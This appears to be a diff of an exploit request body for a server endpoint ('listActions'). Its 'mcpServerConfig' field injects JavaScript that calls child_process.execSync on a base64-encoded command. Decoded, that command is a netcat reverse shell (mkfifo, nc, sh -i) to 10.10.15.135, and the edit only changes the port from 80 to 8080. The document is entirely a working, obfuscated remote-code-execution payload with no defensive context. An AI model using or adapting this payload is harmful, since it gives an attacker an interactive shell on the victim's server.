@@ -33,6 +33,6 @@
         {
           "loadMethod": "listActions",
           "inputs": {
-            "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo -n     'bWtmaWZvIC90bXAvZjsgbmMgMTAuMTAuMTUuMTM1IDgwIDA8L3RtcC9mIHwgc2ggLWkgMj4mMSB8IHRlZSAvdG1wL2Y=' |base64 -d |sh\");return 1;})()})"
+            "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo -n     'bWtmaWZvIC90bXAvZjsgbmMgMTAuMTAuMTUuMTM1IDgwODAgMDwvdG1wL2YgfCBzaCAtaSAyPiYxIHwgdGVlIC90bXAvZg==' |base64 -d |sh\");return 1;})()})"
           }
         }
